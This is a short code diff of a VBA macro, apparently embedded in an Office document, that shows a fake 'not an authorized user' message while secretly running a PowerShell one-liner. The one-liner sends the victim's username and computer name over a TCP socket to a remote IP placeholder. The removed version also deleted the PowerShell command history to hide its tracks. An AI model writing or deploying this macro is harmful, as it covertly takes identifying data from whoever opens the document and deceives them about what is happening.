@@ -5,8 +5,12 @@ Dim Run
 Unauthorized.Label1.Caption = "The User: " & (Environ$("Username")) & " is not recognized as an authorized user. You must be added as an authorized user before you can view this document."
 If (InStr(TheOS, "Windows")) Then
 Unauthorized.Show (False)
-Dim data
-sendData = "$data = [System.Text.Encoding]::ASCII.GetBytes('Username:$env:username---Computer:$env:computername');(new-object System.Net.Sockets.TcpClient('<Ip Address>',<port>)).GetStream().Write($data,0,$data.Length);Remove-Item (Get-PSReadlineOption).HistorySavePath"
+Dim sendData
+Dim username
+username = (Environ$("Username"))
+Dim compname
+compname = Environ$("computername")
+sendData = "$data = [System.Text.Encoding]::ASCII.GetBytes('Username:" & username & "---Computer: " & compname & "');(new-object System.Net.Sockets.TcpClient('remote-IPaddress',<port>)).GetStream().Write($data,0,$data.Length);"
 Shell ("powershell " & sendData)
 End If
 'If (InStr(TheOS, "Mac")) Then
